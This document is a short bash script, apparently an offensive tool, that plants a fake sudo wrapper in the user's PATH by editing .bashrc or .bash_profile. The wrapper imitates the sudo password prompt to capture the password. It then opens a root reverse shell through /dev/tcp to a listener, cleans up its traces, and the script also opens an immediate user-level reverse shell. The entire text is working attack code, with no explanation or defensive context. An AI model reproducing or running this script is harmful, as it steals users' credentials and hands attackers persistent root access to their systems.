#!/bin/bash

LISTENER_IP="127.0.0.1"
LISTENER1_PORT="1337" #Listener for root shell
LISTENER2_PORT="4444" #Listener for user shell

if [ ! -d ~/.config/sudo ]
then
    mkdir -p ~/.config/sudo
fi

if [ -f  ~/.config/sudo/sudo ]
then
    rm  ~/.config/sudo/sudo
fi


echo '#!'$SHELL >> ~/.config/sudo/sudo
cat <<'EOF' >> ~/.config/sudo/sudo
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
    /usr/bin/sudo $@
else
    echo -n "[sudo] password for $USER: "
    read -s pwd
    echo
    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    if [ $? -eq 1 ]
    then
    echo "Sorry, try again."
	sudo $@
    else
	/usr/bin/sudo -S $@
	if [ -f ~/.bash_profile ]
    then
    rm ~/.bash_profile
    mv ~/.bash_profile.bak ~/.bash_profile
    else
    rm ~/.bashrc
    mv ~/.bashrc.bak ~/.bashrc
    fi
    rm ~/.config/sudo/sudo
    echo "$pwd" | sudo -S disown !$ $(sudo /bin/bash -i  > /dev/tcp/$LISTENER_IP/$LISTENER1_PORT 0<&1 2>&1) &
    fi
fi
EOF

chmod u+x ~/.config/sudo/sudo
if [ -f ~/.bash_profile ]
then
    cp ~/.bash_profile ~/.bash_profile.bak
    echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
else
    cp ~/.bashrc ~/.bashrc.bak
    echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
fi
disown !$ $(/bin/bash -i  > /dev/tcp/$LISTENER_IP/$LISTENER2_PORT 0<&1 2>&1) &
bash
